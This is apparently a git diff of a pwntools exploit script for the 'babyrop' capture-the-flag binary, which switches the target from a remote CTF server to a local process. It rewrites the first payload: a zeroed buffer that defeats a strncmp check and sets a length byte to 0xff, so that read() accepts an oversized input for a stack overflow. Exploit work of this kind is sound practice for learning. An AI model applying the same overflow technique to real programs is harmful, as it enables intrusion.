@@ -8,11 +8,16 @@ puts_got = elf.got['puts']
 
 log.info(f'puts: got={hex(puts_got)}; plt={hex(puts_plt)}')
 
-# proc = process('./babyrop')
-proc = remote('node3.buuoj.cn', 26351)
+proc = process('./babyrop')
+# proc = remote('node3.buuoj.cn', 26351)
 main = 0x08048825
 
-payload_length = b'\x00'*7 + b'\xff' + b'\x00' * 24
+# strncmp(payload_length, a, strlen(payload_length)) always returns 0
+payload_length = [0] * 0x20
+# read() is misled to take an input of length 0xff
+payload_length[7] = 0xff
+payload_length = bytes(payload_length)
+
 proc.send(payload_length)
 log.info(proc.recvuntil('\n'))
 
